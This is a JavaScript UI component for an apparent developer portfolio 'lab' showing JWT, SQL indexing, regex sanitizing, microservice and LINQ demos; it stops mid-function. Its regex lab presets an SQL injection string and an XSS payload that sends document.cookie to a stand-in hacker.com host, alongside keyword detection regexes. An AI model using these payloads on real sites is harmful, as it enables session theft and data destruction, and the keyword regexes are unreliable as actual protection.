import confetti from 'canvas-confetti';
import { getIconSvg } from '../utils/icons.js';

/**
 * CyberDevLab - Phòng Lab Kỹ Thuật Lập Trình & Tối Ưu Hệ Thống
 * Thay thế bộ mật mã cũ bằng 4 trạm thực nghiệm chuyên sâu:
 * 1. JWT Token Inspector & Security Analyzer (Giải mã & soi chữ ký JWT)
 * 2. SQL Server Index & Query Optimizer (Benchmark truy vấn 1.5M dòng)
 * 3. Regex Pattern & Security Sanitizer (Lọc XSS & chặn SQL Injection)
 * 4. Microservices & SignalR Live Simulator (Mô phỏng kiến trúc phân tán thời gian thực)
 */
export class CipherLab {
  constructor(container, soundManager, onPuzzleSolved) {
    this.container = container;
    this.sound = soundManager;
    this.onPuzzleSolved = onPuzzleSolved;
    this.completedModules = new Set();

    this.render();
  }

  render() {
    this.container.innerHTML = `
      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 w-full max-w-6xl mx-auto code-font">
        
        <!-- LAB 1: JWT INSPECTOR & SECURITY ANALYZER -->
        <div class="bg-slate-900/90 border border-purple-500/30 rounded-3xl p-5 sm:p-6 shadow-2xl flex flex-col justify-between hover:border-purple-400/60 transition-all">
          <div>
            <div class="flex items-center justify-between mb-4">
              <div class="flex items-center gap-2.5">
                <div class="w-9 h-9 rounded-2xl bg-purple-500/10 border border-purple-500/30 text-purple-400 flex items-center justify-center">
                  ${getIconSvg('lock', 'w-4 h-4 text-purple-400')}
                </div>
                <div>
                  <h3 class="text-sm sm:text-base font-bold text-white">1. JWT Token & Claims Inspector</h3>
                  <span class="text-[10px] text-slate-400">Giải mã & kiểm chứng chữ ký HMAC-SHA256</span>
                </div>
              </div>
              <span id="jwt-badge" class="px-2.5 py-1 rounded-full text-[10px] font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 flex items-center gap-1">
                ${getIconSvg('shield-check', 'w-3 h-3')} <span>256-bit Valid</span>
              </span>
            </div>

            <!-- Token selector tabs -->
            <div class="flex flex-wrap gap-1.5 mb-3 text-xs">
              <button id="btn-jwt-admin" class="h-8 inline-flex items-center px-3 rounded-xl bg-purple-500/20 text-purple-300 border border-purple-500/40 text-xs font-bold hover:bg-purple-500/30 transition-all shadow-sm">
                Admin (.NET Lead)
              </button>
              <button id="btn-jwt-expired" class="h-8 inline-flex items-center px-3 rounded-xl bg-slate-950 text-slate-400 border border-white/10 text-xs font-semibold hover:text-white hover:border-white/20 transition-all">
                Token Hết Hạn
              </button>
              <button id="btn-jwt-tampered" class="h-8 inline-flex items-center px-3 rounded-xl bg-slate-950 text-slate-400 border border-white/10 text-xs font-semibold hover:text-white hover:border-white/20 transition-all">
                Giả Mạo Chữ Ký
              </button>
            </div>

            <!-- Encoded string box -->
            <div class="bg-slate-950/90 border border-white/10 rounded-2xl p-3 mb-3 break-all text-[11px] leading-relaxed">
              <span class="text-slate-500 block text-[9px] uppercase tracking-wider mb-1">Raw Encoded JWT:</span>
              <span id="jwt-raw-header" class="text-rose-400 font-bold">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.<span id="jwt-raw-payload" class="text-purple-300 font-bold">eyJzdWIiOiJkdW9uZ3RpZW5kYXQiLCJuYW1lIjoiRMawxqFuZyBUaeG6v24gxJDhuqF0Iiwicm9sZSI6WyJTZW5pb3IgLk5FVCBEZXYiLCJUZWNoTGVhZCJdLCJleHAiOjE3ODkwMDAwMDB9</span>.<span id="jwt-raw-sign" class="text-cyan-400 font-bold">9kF1Z3wQxP_8j2mA7x8zVw8e5rT9</span>
            </div>

            <!-- Decoded JSON View -->
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 text-[11px]">
              <div class="bg-slate-950/80 p-3 rounded-xl border border-rose-500/20">
                <span class="text-rose-400 font-bold block text-[10px] mb-1">HEADER: Algorithm & Type</span>
                <pre class="text-slate-300 font-mono text-[10px] leading-tight" id="jwt-decoded-header">{
  "alg": "HS256",
  "typ": "JWT"
}</pre>
              </div>
              <div class="bg-slate-950/80 p-3 rounded-xl border border-purple-500/20">
                <span class="text-purple-400 font-bold block text-[10px] mb-1">PAYLOAD: Identity & Roles</span>
                <pre class="text-slate-300 font-mono text-[10px] leading-tight" id="jwt-decoded-payload">{
  "sub": "duongtiendat",
  "name": "Dương Tiến Đạt",
  "roles": [
    ".NET Fullstack",
    "BPM/HRM Architect"
  ]
}</pre>
              </div>
            </div>
          </div>

          <div class="mt-4 pt-3 border-t border-white/10 flex items-center justify-between text-xs">
            <span class="text-slate-400 text-[11px] flex items-center gap-1">
              ${getIconSvg('key-round', 'w-3 h-3 text-purple-400')} <span id="jwt-secret-hint">Secret: <b>KidsPlaza_Security_Key_2026</b></span>
            </span>
            <button id="btn-verify-jwt" class="px-4 py-1.5 rounded-xl bg-purple-500 hover:bg-purple-400 text-white font-bold text-xs shadow-lg transition-all flex items-center gap-1.5">
              ${getIconSvg('shield-check', 'w-3.5 h-3.5')} <span>Xác Thực Token</span>
            </button>
          </div>
        </div>

        <!-- LAB 2: SQL SERVER INDEX & EXECUTION PLAN OPTIMIZER -->
        <div class="bg-slate-900/90 border border-cyan-500/30 rounded-3xl p-5 sm:p-6 shadow-2xl flex flex-col justify-between hover:border-cyan-400/60 transition-all">
          <div>
            <div class="flex items-center justify-between mb-4">
              <div class="flex items-center gap-2.5">
                <div class="w-9 h-9 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 flex items-center justify-center">
                  ${getIconSvg('database', 'w-4 h-4 text-cyan-400')}
                </div>
                <div>
                  <h3 class="text-sm sm:text-base font-bold text-white">2. SQL Query & Index Benchmark</h3>
                  <span class="text-[10px] text-slate-400">Bảng Orders: 1,500,000 dòng dữ liệu</span>
                </div>
              </div>
              <span id="sql-badge" class="px-2.5 py-1 rounded-full text-[10px] font-bold bg-cyan-500/10 text-cyan-400 border border-cyan-500/30">
                Sẵn sàng đo tốc độ
              </span>
            </div>

            <!-- Strategy select -->
            <div class="space-y-2 mb-3 text-xs">
              <label class="flex items-center gap-2.5 p-2.5 rounded-xl bg-slate-950/80 border border-white/10 cursor-pointer hover:border-cyan-400/40 transition-all">
                <input type="radio" name="sql-strat" value="scan" checked class="accent-cyan-400" />
                <div class="flex-1">
                  <div class="flex justify-between font-bold text-slate-200 text-[11px]">
                    <span>1. Table Scan (Không có Index)</span>
                    <span class="text-rose-400">~380 ms • Cost 96%</span>
                  </div>
                  <span class="text-[10px] text-slate-400 block font-mono">SELECT * FROM Orders WHERE CustomerPhone = '098...'</span>
                </div>
              </label>

              <label class="flex items-center gap-2.5 p-2.5 rounded-xl bg-slate-950/80 border border-white/10 cursor-pointer hover:border-cyan-400/40 transition-all">
                <input type="radio" name="sql-strat" value="seek" class="accent-cyan-400" />
                <div class="flex-1">
                  <div class="flex justify-between font-bold text-slate-200 text-[11px]">
                    <span>2. Non-Clustered Index + Key Lookup</span>
                    <span class="text-amber-400">~22 ms • Cost 28%</span>
                  </div>
                  <span class="text-[10px] text-slate-400 block font-mono">INDEX(CustomerPhone) -> Key Lookup về Clustered Table</span>
                </div>
              </label>

              <label class="flex items-center gap-2.5 p-2.5 rounded-xl bg-slate-950/80 border border-emerald-500/30 bg-emerald-500/5 cursor-pointer hover:border-emerald-400 transition-all">
                <input type="radio" name="sql-strat" value="covering" class="accent-emerald-400" />
                <div class="flex-1">
                  <div class="flex justify-between font-bold text-emerald-400 text-[11px]">
                    <span>3. Covering Index (Tối Ưu Tuyệt Đối)</span>
                    <span class="text-emerald-400 font-bold">~1.2 ms • Cost 1%</span>
                  </div>
                  <span class="text-[10px] text-slate-400 block font-mono">INDEX(CustomerPhone) INCLUDE(TotalAmount, Status)</span>
                </div>
              </label>
            </div>

            <!-- Execution visual result -->
            <div class="bg-slate-950/90 border border-white/10 rounded-2xl p-3 text-xs space-y-2">
              <div class="flex justify-between text-[11px]">
                <span class="text-slate-400">Thời gian thực thi truy vấn:</span>
                <span id="sql-time-metric" class="font-bold text-cyan-400">Chưa đo</span>
              </div>
              <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden">
                <div id="sql-progress-bar" class="bg-gradient-to-r from-cyan-500 to-emerald-400 h-full w-0 transition-all duration-500"></div>
              </div>
              <div class="flex justify-between text-[10px] text-slate-400 font-mono">
                <span id="sql-io-metric">Logical Reads: -</span>
                <span id="sql-plan-metric">Execution Plan: -</span>
              </div>
            </div>
          </div>

          <div class="mt-4 pt-3 border-t border-white/10 flex items-center justify-between text-xs">
            <span class="text-slate-400 text-[11px]">Đo quét I/O đĩa cứng & bộ nhớ đệm Buffer</span>
            <button id="btn-run-sql-benchmark" class="px-4 py-1.5 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-xs shadow-lg transition-all flex items-center gap-1.5">
              ${getIconSvg('gauge', 'w-3.5 h-3.5')} <span>Chạy Benchmark</span>
            </button>
          </div>
        </div>

        <!-- LAB 3: REGEX PATTERN & SECURITY SANITIZER -->
        <div class="bg-slate-900/90 border border-emerald-500/30 rounded-3xl p-5 sm:p-6 shadow-2xl flex flex-col justify-between hover:border-emerald-400/60 transition-all">
          <div>
            <div class="flex items-center justify-between mb-4">
              <div class="flex items-center gap-2.5">
                <div class="w-9 h-9 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 flex items-center justify-center">
                  ${getIconSvg('shield-alert', 'w-4 h-4 text-emerald-400')}
                </div>
                <div>
                  <h3 class="text-sm sm:text-base font-bold text-white">3. Regex & Web Security Sanitizer</h3>
                  <span class="text-[10px] text-slate-400">Bộ lọc ngăn chặn SQLi, XSS & kiểm tra cú pháp</span>
                </div>
              </div>
              <span id="regex-verdict" class="px-2.5 py-1 rounded-full text-[10px] font-bold bg-slate-950 text-slate-400 border border-white/10">
                Chờ kiểm tra
              </span>
            </div>

            <!-- Quick attack presets -->
            <div class="flex flex-wrap gap-1.5 mb-3 text-xs">
              <button data-type="sqli" class="regex-preset-btn h-8 inline-flex items-center px-3 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 font-bold hover:bg-rose-500/20 transition-all text-xs">
                Thử SQL Injection
              </button>
              <button data-type="xss" class="regex-preset-btn h-8 inline-flex items-center px-3 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-300 font-bold hover:bg-amber-500/20 transition-all text-xs">
                Thử XSS Script
              </button>
              <button data-type="phone" class="regex-preset-btn h-8 inline-flex items-center px-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 font-bold hover:bg-emerald-500/20 transition-all text-xs">
                SĐT Việt Nam Hợp Lệ
              </button>
            </div>

            <!-- Input area -->
            <div class="space-y-2 mb-3">
              <div class="relative">
                <input id="regex-input-text" type="text" value="admin' OR '1'='1' -- DROP TABLE Users;" class="w-full bg-slate-950 border border-white/10 rounded-xl px-3 py-2 text-xs text-cyan-300 font-mono outline-none focus:border-emerald-400 transition-all" />
              </div>
              <div class="bg-slate-950/80 p-3 rounded-xl border border-white/5 text-[11px] text-slate-300">
                <span class="text-slate-500 block text-[9px] uppercase tracking-wider mb-0.5">Biểu thức chính quy (Regex Pattern):</span>
                <code id="regex-pattern-display" class="text-emerald-400 font-mono text-[10px] block break-all">(\b(ALTER|CREATE|DELETE|DROP|EXEC(UTE)?|INSERT( +INTO)?|MERGE|SELECT|UPDATE|UNION( +ALL)?)\b)|('OR'1'='1')</code>
              </div>
            </div>

            <!-- Match explanation -->
            <div id="regex-explanation" class="p-3 rounded-xl bg-slate-950/90 border border-rose-500/30 text-xs text-rose-300">
              Phát hiện ký tự nguy hiểm: Kẻ tấn công cố tình chèn mệnh đề OR '1'='1' để vượt qua xác thực!
            </div>
          </div>

          <div class="mt-4 pt-3 border-t border-white/10 flex items-center justify-between text-xs">
            <span class="text-slate-400 text-[11px]">Bảo vệ tầng Model Validation trong ASP.NET Core</span>
            <button id="btn-run-regex" class="px-4 py-1.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold text-xs shadow-lg transition-all flex items-center gap-1.5">
              ${getIconSvg('check-circle-2', 'w-3.5 h-3.5')} <span>Lọc Payload</span>
            </button>
          </div>
        </div>

        <!-- LAB 4: REALTIME DISTRIBUTED ARCHITECTURE SIMULATOR -->
        <div class="bg-slate-900/90 border border-amber-500/30 rounded-3xl p-5 sm:p-6 shadow-2xl flex flex-col justify-between hover:border-amber-400/60 transition-all">
          <div>
            <div class="flex items-center justify-between mb-4">
              <div class="flex items-center gap-2.5">
                <div class="w-9 h-9 rounded-2xl bg-amber-500/10 border border-amber-500/30 text-amber-400 flex items-center justify-center">
                  ${getIconSvg('workflow', 'w-4 h-4 text-amber-400')}
                </div>
                <div>
                  <h3 class="text-sm sm:text-base font-bold text-white">4. Microservices & SignalR Live Hub</h3>
                  <span class="text-[10px] text-slate-400">Mô phỏng kiến trúc bán hàng POS & Màn hình phụ</span>
                </div>
              </div>
              <span id="arch-status-badge" class="px-2.5 py-1 rounded-full text-[10px] font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30">
                100% HEALTHY
              </span>
            </div>

            <!-- Visual Node Flow -->
            <div class="bg-slate-950/90 border border-white/10 rounded-2xl p-4 mb-3 text-center">
              <div class="grid grid-cols-4 gap-2 text-[10px] font-bold items-center">
                <div id="node-client" class="p-2 rounded-xl bg-slate-900 border border-cyan-400/40 text-cyan-300 transition-all">
                  <span>Client POS</span>
                </div>
                <div id="node-gateway" class="p-2 rounded-xl bg-slate-900 border border-purple-400/40 text-purple-300 transition-all">
                  <span>API Gateway</span>
                </div>
                <div id="node-signalr" class="p-2 rounded-xl bg-slate-900 border border-amber-400/40 text-amber-300 transition-all">
                  <span>SignalR Hub</span>
                </div>
                <div id="node-db" class="p-2 rounded-xl bg-slate-900 border border-emerald-400/40 text-emerald-300 transition-all">
                  <span>SQL / Redis</span>
                </div>
              </div>
              <div class="mt-3 flex justify-between text-[9px] text-slate-500 font-mono">
                <span>[Màn hình bán lẻ]</span>
                <span>[Ocelot Routing]</span>
                <span>[2-Way WebSocket]</span>
                <span>[Cache 99.4%]</span>
              </div>
            </div>

            <!-- Live Metrics Counter -->
            <div class="grid grid-cols-3 gap-2 text-center text-xs mb-1">
              <div class="bg-slate-950/80 p-2 rounded-xl border border-white/5">
                <span class="text-[9px] text-slate-500 block">THROUGHPUT</span>
                <span id="arch-throughput" class="text-cyan-400 font-bold text-sm">2,450 req/s</span>
              </div>
              <div class="bg-slate-950/80 p-2 rounded-xl border border-white/5">
                <span class="text-[9px] text-slate-500 block">ĐỘ TRỄ (LATENCY)</span>
                <span id="arch-latency" class="text-emerald-400 font-bold text-sm">3.8 ms</span>
              </div>
              <div class="bg-slate-950/80 p-2 rounded-xl border border-white/5">
                <span class="text-[9px] text-slate-500 block">CACHE HIT</span>
                <span id="arch-cache" class="text-amber-400 font-bold text-sm">99.8%</span>
              </div>
            </div>
          </div>

          <div class="mt-4 pt-3 border-t border-white/10 flex items-center justify-between text-xs">
            <div class="flex items-center gap-2">
              <button id="btn-sim-traffic" class="h-8 inline-flex items-center px-3 rounded-xl bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold hover:bg-amber-500/30 text-xs transition-all shadow-sm">
                Gửi 1,000 Đơn
              </button>
              <button id="btn-sim-cache" class="h-8 inline-flex items-center px-3 rounded-xl bg-slate-950 text-slate-300 border border-white/10 text-xs font-semibold hover:text-white hover:border-white/20 transition-all">
                Đổi Giá Realtime
              </button>
            </div>
            <span id="arch-progress-text" class="text-[11px] text-emerald-400 font-bold">SignalR Active</span>
          </div>
        </div>

        <!-- LAB 5: C# LINQ PIPELINE & DATA QUERY SIMULATOR -->
        <div class="lg:col-span-2 bg-slate-900/90 border border-cyan-500/30 rounded-3xl p-5 sm:p-6 shadow-2xl flex flex-col justify-between hover:border-cyan-400/60 transition-all">
          <div>
            <div class="flex items-center justify-between mb-4">
              <div class="flex items-center gap-2.5">
                <div class="w-9 h-9 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 flex items-center justify-center shadow-lg shadow-cyan-500/10">
                  ${getIconSvg('database', 'w-4 h-4 text-cyan-400')}
                </div>
                <div>
                  <h3 class="text-sm sm:text-base font-bold text-white">5. C# LINQ Pipeline & Execution Sandbox</h3>
                  <span class="text-[10px] text-slate-400">Trực quan hóa luồng lọc dữ liệu in-memory (.NET Core Collections & EF Core)</span>
                </div>
              </div>
              <span id="linq-status-badge" class="px-2.5 py-1 rounded-full text-[10px] font-bold bg-cyan-500/10 text-cyan-400 border border-cyan-500/30">
                12 HRM RECORDS
              </span>
            </div>

            <!-- LINQ Query Presets -->
            <div class="flex flex-wrap gap-2 mb-4 text-xs">
              <button data-query="top-earners" class="linq-query-btn h-8 inline-flex items-center px-3 rounded-xl bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 font-bold hover:bg-cyan-500/30 text-xs transition-all shadow-sm">
                Lương Cao Nhất (.Take(3))
              </button>
              <button data-query="senior-devs" class="linq-query-btn h-8 inline-flex items-center px-3 rounded-xl bg-slate-950 text-slate-400 border border-white/10 text-xs font-semibold hover:text-white hover:border-white/20 transition-all">
                Senior .NET Dev (.Exp >= 3)
              </button>
              <button data-query="group-dept" class="linq-query-btn h-8 inline-flex items-center px-3 rounded-xl bg-slate-950 text-slate-400 border border-white/10 text-xs font-semibold hover:text-white hover:border-white/20 transition-all">
                Nhóm Theo Phòng Ban (.GroupBy)
              </button>
              <button data-query="high-rating" class="linq-query-btn h-8 inline-flex items-center px-3 rounded-xl bg-slate-950 text-slate-400 border border-white/10 text-xs font-semibold hover:text-white hover:border-white/20 transition-all">
                Đánh Giá Cao (.Rating >= 4.7)
              </button>
            </div>

            <!-- Code & Pipeline Visualizer -->
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
              <!-- C# LINQ Expression Code Box -->
              <div class="bg-slate-950/90 border border-white/10 rounded-2xl p-3.5 text-[11px] leading-relaxed">
                <div class="flex items-center justify-between text-slate-500 text-[10px] uppercase font-bold mb-2 pb-1 border-b border-white/5">
                  <span>C# LINQ Expression</span>
                  <span id="linq-exec-time" class="text-emerald-400 code-font">0.08 ms</span>
                </div>
                <pre id="linq-code-display" class="text-cyan-300 font-mono text-[11px] whitespace-pre-wrap">var result = employees
    .Where(e => e.Salary >= 28_000_000)
    .OrderByDescending(e => e.Salary)
    .Take(3)
    .ToList();</pre>
              </div>

              <!-- Generated SQL Equivalent -->
              <div class="bg-slate-950/90 border border-white/10 rounded-2xl p-3.5 text-[11px] leading-relaxed">
                <div class="flex items-center justify-between text-slate-500 text-[10px] uppercase font-bold mb-2 pb-1 border-b border-white/5">
                  <span>Equivalent SQL Generated (EF Core)</span>
                  <span class="text-amber-400 code-font">Indexed Query</span>
                </div>
                <pre id="linq-sql-display" class="text-amber-300 font-mono text-[11px] whitespace-pre-wrap">SELECT TOP 3 [Id], [Name], [Dept], [Role], [Salary]
FROM [Employees]
WHERE [Salary] >= 28000000
ORDER BY [Salary] DESC;</pre>
              </div>
            </div>

            <!-- Interactive Results Table -->
            <div class="bg-slate-950/80 border border-white/10 rounded-2xl p-3 overflow-x-auto cyber-scroll">
              <div class="flex items-center justify-between text-[11px] mb-2 px-1">
                <span class="text-slate-400">Kết quả lọc: <strong id="linq-result-count" class="text-cyan-400">3 bản ghi</strong></span>
                <span class="text-slate-500 text-[10px]">Memory: Immutable Pipeline Stream</span>
              </div>
              <div id="linq-table-container">
                <!-- dynamic rows -->
              </div>
            </div>
          </div>

          <div class="mt-4 pt-3 border-t border-white/10 flex items-center justify-between text-xs">
            <span class="text-slate-400 text-[11px]">Tối ưu LINQ-to-Entities & In-Memory Enumerable trong các dự án thực tế</span>
            <button id="btn-run-linq" class="px-4 py-1.5 rounded-xl bg-gradient-to-r from-cyan-500 to-emerald-400 text-slate-950 font-bold text-xs shadow-lg transition-all flex items-center gap-1.5 hover:scale-105">
              ${getIconSvg('play', 'w-3.5 h-3.5')} <span>Thực Thi LINQ</span>
            </button>
          </div>
        </div>

      </div>
    `;

    this.initJwtModule();
    this.initSqlModule();
    this.initRegexModule();
    this.initArchModule();
    this.initLinqModule();
  }

  // 1. JWT MODULE LOGIC
  initJwtModule() {
    const rawHeader = this.container.querySelector('#jwt-raw-header');
    const rawPayload = this.container.querySelector('#jwt-raw-payload');
    const rawSign = this.container.querySelector('#jwt-raw-sign');
    const decHeader = this.container.querySelector('#jwt-decoded-header');
    const decPayload = this.container.querySelector('#jwt-decoded-payload');
    const badge = this.container.querySelector('#jwt-badge');
    const verifyBtn = this.container.querySelector('#btn-verify-jwt');

    const btnAdmin = this.container.querySelector('#btn-jwt-admin');
    const btnExp = this.container.querySelector('#btn-jwt-expired');
    const btnTamper = this.container.querySelector('#btn-jwt-tampered');

    const setPreset = (type) => {
      this.sound.playClick(500);
      [btnAdmin, btnExp, btnTamper].forEach(b => {
        b.className = 'h-8 inline-flex items-center px-3 rounded-xl bg-slate-950 text-slate-400 border border-white/10 text-xs font-semibold hover:text-white hover:border-white/20 transition-all';
      });

      if (type === 'admin') {
        btnAdmin.className = 'h-8 inline-flex items-center px-3 rounded-xl bg-purple-500/20 text-purple-300 border border-purple-500/40 text-xs font-bold hover:bg-purple-500/30 transition-all shadow-sm';
        rawPayload.textContent = 'eyJzdWIiOiJkdW9uZ3RpZW5kYXQiLCJuYW1lIjoiRMawxqFuZyBUaeG6v24gxJDhuqF0Iiwicm9sZSI6WyJTZW5pb3IgLk5FVCBEZXYiLCJUZWNoTGVhZCJdLCJleHAiOjE3ODkwMDAwMDB9';
        rawSign.textContent = '9kF1Z3wQxP_8j2mA7x8zVw8e5rT9';
        rawSign.className = 'text-cyan-400 font-bold';
        decPayload.textContent = JSON.stringify({
          sub: "duongtiendat",
          name: "Dương Tiến Đạt",
          roles: ["Senior .NET Dev", "TechLead"],
          permissions: ["hrm.manage", "bpm.approve_all"],
          exp: 1789000000
        }, null, 2);
        badge.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 flex items-center gap-1';
        badge.innerHTML = `${getIconSvg('shield-check', 'w-3 h-3')} <span>256-bit Valid</span>`;
      } else if (type === 'expired') {
        btnExp.className = 'h-8 inline-flex items-center px-3 rounded-xl bg-amber-500/20 text-amber-300 border border-amber-500/40 text-xs font-bold hover:bg-amber-500/30 transition-all shadow-sm';
        rawPayload.textContent = 'eyJzdWIiOiJkdW9uZ3RpZW5kYXQiLCJyb2xlIjoiR3Vlc3QiLCJleHAiOjE2MDAwMDAwMDB9';
        rawSign.textContent = 'Expired_Sign_Check_OldToken';
        rawSign.className = 'text-amber-400 font-bold';
        decPayload.textContent = JSON.stringify({
          sub: "duongtiendat",
          role: "Guest",
          exp: 1600000000,
          status: "TOKEN_EXPIRED (Auto-Refresh Required)"
        }, null, 2);
        badge.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-amber-500/10 text-amber-400 border border-amber-500/30 flex items-center gap-1';
        badge.innerHTML = `${getIconSvg('alert-circle', 'w-3 h-3')} <span>Expired Token</span>`;
      } else if (type === 'tampered') {
        btnTamper.className = 'h-8 inline-flex items-center px-3 rounded-xl bg-rose-500/20 text-rose-300 border border-rose-500/40 text-xs font-bold hover:bg-rose-500/30 transition-all shadow-sm';
        rawPayload.textContent = 'eyJzdWIiOiJoYWNrZXIiLCJyb2xlcyI6WyJzdXBlcmFkbWluIl19';
        rawSign.textContent = 'Tampered_Corrupted_Invalid_Hash';
        rawSign.className = 'text-rose-400 font-bold line-through';
        decPayload.textContent = JSON.stringify({
          sub: "hacker",
          roles: ["superadmin (INJECTED)"],
          warning: "SIGNATURE_VERIFICATION_FAILED"
        }, null, 2);
        badge.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-rose-500/10 text-rose-400 border border-rose-500/30 flex items-center gap-1';
        badge.innerHTML = `${getIconSvg('shield-alert', 'w-3 h-3')} <span>Signature Mismatch!</span>`;
      }
    };

    btnAdmin.addEventListener('click', () => setPreset('admin'));
    btnExp.addEventListener('click', () => setPreset('expired'));
    btnTamper.addEventListener('click', () => setPreset('tampered'));

    verifyBtn.addEventListener('click', () => {
      this.sound.playSuccess();
      confetti({ particleCount: 50, spread: 60, origin: { y: 0.7 } });
      badge.classList.add('scale-110');
      setTimeout(() => badge.classList.remove('scale-110'), 300);
      this.markModuleSolved('jwt');
    });
  }

  // 2. SQL BENCHMARK LOGIC
  initSqlModule() {
    const runBtn = this.container.querySelector('#btn-run-sql-benchmark');
    const timeMetric = this.container.querySelector('#sql-time-metric');
    const ioMetric = this.container.querySelector('#sql-io-metric');
    const planMetric = this.container.querySelector('#sql-plan-metric');
    const progressBar = this.container.querySelector('#sql-progress-bar');
    const badge = this.container.querySelector('#sql-badge');

    runBtn.addEventListener('click', () => {
      this.sound.playClick(650);
      const selected = this.container.querySelector('input[name="sql-strat"]:checked').value;

      progressBar.style.width = '0%';
      badge.textContent = 'Đang benchmark 1.5M dòng...';
      badge.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-amber-500/10 text-amber-400 border border-amber-500/30 animate-pulse';

      setTimeout(() => {
        progressBar.style.width = '100%';
        this.sound.playSuccess();

        if (selected === 'scan') {
          timeMetric.textContent = '382 ms (Quá chậm)';
          timeMetric.className = 'font-bold text-rose-400 text-sm';
          ioMetric.textContent = 'Logical Reads: 48,200 pages (IO nghẽn)';
          planMetric.textContent = 'Plan: Clustered Index Scan (Cost: 96%)';
          badge.textContent = 'Cảnh báo: Cần thêm Index';
          badge.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-rose-500/10 text-rose-400 border border-rose-500/30';
        } else if (selected === 'seek') {
          timeMetric.textContent = '21.4 ms (Khá nhanh)';
          timeMetric.className = 'font-bold text-amber-400 text-sm';
          ioMetric.textContent = 'Logical Reads: 420 pages (Key Lookup)';
          planMetric.textContent = 'Plan: Index Seek + Nested Loops (Cost: 28%)';
          badge.textContent = 'Tốt: Đã Index Seek';
          badge.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-amber-500/10 text-amber-400 border border-amber-500/30';
        } else if (selected === 'covering') {
          timeMetric.textContent = '1.18 ms (CỰC ĐỈNH - NHANH GẤP 320 LẦN)';
          timeMetric.className = 'font-bold text-emerald-400 text-sm animate-pulse';
          ioMetric.textContent = 'Logical Reads: 3 pages (Không đụng đĩa)';
          planMetric.textContent = 'Plan: Pure Covering Index Seek (Cost: 1%)';
          badge.textContent = '✓ Chuẩn Kiến Trúc Sư Tối Ưu';
          badge.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/40';
          confetti({ particleCount: 70, spread: 70, origin: { y: 0.7 } });
        }

        this.markModuleSolved('sql');
      }, 500);
    });
  }

  // 3. REGEX & SECURITY SANITIZER LOGIC
  initRegexModule() {
    const input = this.container.querySelector('#regex-input-text');
    const patternDisplay = this.container.querySelector('#regex-pattern-display');
    const verdict = this.container.querySelector('#regex-verdict');
    const explain = this.container.querySelector('#regex-explanation');
    const runBtn = this.container.querySelector('#btn-run-regex');
    const presetBtns = this.container.querySelectorAll('.regex-preset-btn');

    presetBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        this.sound.playClick(500);
        const type = btn.dataset.type;
        if (type === 'sqli') {
          input.value = "admin' OR '1'='1' -- DROP TABLE Users;";
          patternDisplay.textContent = "(\\b(ALTER|CREATE|DELETE|DROP|EXEC|INSERT|SELECT|UPDATE|UNION)\\b)|('OR'1'='1')";
        } else if (type === 'xss') {
          input.value = "<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>";
          patternDisplay.textContent = "<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>|javascript:";
        } else if (type === 'phone') {
          input.value = "+84 987 654 321";
          patternDisplay.textContent = "^(\\+84|0)(3|5|7|8|9)[0-9]{8}$";
        }
        checkSecurity();
      });
    });

    const checkSecurity = () => {
      const val = input.value.trim();
      const isSqli = /('OR'1'='1'|--|DROP|DELETE|ALTER|UNION)/i.test(val);
      const isXss = /(<script|javascript:|alert\(|onerror=)/i.test(val);
      const isPhone = /^(\+84|0)[3|5|7|8|9][0-9]{8}$/.test(val.replace(/\s/g, ''));

      if (isSqli) {
        this.sound.playClick(260);
        verdict.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-rose-500/20 text-rose-400 border border-rose-500/40';
        verdict.innerHTML = `${getIconSvg('shield-alert', 'w-3 h-3')} <span>🚨 CHẶN SQL INJECTION</span>`;
        explain.className = 'p-3 rounded-xl bg-slate-950/90 border border-rose-500/40 text-xs text-rose-300';
        explain.textContent = 'Phát hiện câu lệnh SQL Injection cố tình phá vỡ cấu trúc truy vấn. Tự động chuyển qua Parameterized Query (@Phone) an toàn!';
      } else if (isXss) {
        this.sound.playClick(260);
        verdict.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-amber-500/20 text-amber-400 border border-amber-500/40';
        verdict.innerHTML = `${getIconSvg('shield-alert', 'w-3 h-3')} <span>🚨 CHẶN XSS ATTACK</span>`;
        explain.className = 'p-3 rounded-xl bg-slate-950/90 border border-amber-500/40 text-xs text-amber-300';
        explain.textContent = 'Phát hiện thẻ <script> chứa mã độc Cross-Site Scripting. Tự động mã hóa ký tự HTML Sanitizer (&lt;script&gt;) thành chuỗi an toàn.';
      } else if (isPhone) {
        this.sound.playSuccess();
        verdict.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/40';
        verdict.innerHTML = `${getIconSvg('check-circle-2', 'w-3 h-3')} <span>✓ HỢP LỆ (VIETNAM TEL)</span>`;
        explain.className = 'p-3 rounded-xl bg-slate-950/90 border border-emerald-500/40 text-xs text-emerald-300';
